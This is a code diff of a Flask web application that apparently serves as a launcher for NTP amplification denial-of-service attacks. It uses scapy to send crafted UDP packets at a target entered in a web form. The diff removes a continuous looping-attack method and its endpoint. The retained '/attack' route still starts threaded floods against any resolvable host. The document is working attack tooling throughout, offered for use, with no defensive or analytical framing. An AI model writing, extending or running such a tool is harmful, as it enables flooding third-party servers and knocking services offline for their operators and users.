@@ -3,7 +3,6 @@ import random
 import socket
 import threading
 from scapy.all import IP, UDP, Raw, send
-import time
 
 app = Flask(__name__)
 
@@ -57,12 +56,6 @@ class NTPAttack:
         for t in threads:
             t.join()
 
-    def loop_attack(self):
-        """Continuously loop the NTP attack."""
-        while True:
-            self.start_attack()
-            time.sleep(1)  # Add a delay between each loop for sanity
-
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -90,33 +83,6 @@ def attack():
     attack.start_attack()
 
     return jsonify({"message": f"Started attack on {tgt} with {threads} threads."})
-
-@app.route('/loop_attack', methods=['POST'])
-def loop_attack():
-    target = request.form.get('target', '').strip()  # Get target from form and strip whitespace
-    threads = request.form.get('threads', '100')
-
-    if not target:
-        return jsonify({"error": "Target is required!"}), 400
-
-    tgt = check_tgt(target)
-    if tgt is None:
-        return jsonify({"error": f"Can't resolve host: {target}!"}), 400
-
-    try:
-        threads = int(threads)
-        if threads <= 0 or threads > 500:  # Limit the number of threads to a reasonable range
-            return jsonify({"error": "Number of threads must be between 1 and 500!"}), 400
-    except ValueError:
-        return jsonify({"error": "Invalid number of threads!"}), 400
-
-    attack = NTPAttack(tgt, threads)
-    
-    # Start looping attack in a separate thread to avoid blocking the server
-    loop_thread = threading.Thread(target=attack.loop_attack)
-    loop_thread.start()
-
-    return jsonify({"message": f"Started looping attack on {tgt} with {threads} threads."})
 
 if __name__ == '__main__':
     app.run(debug=True)
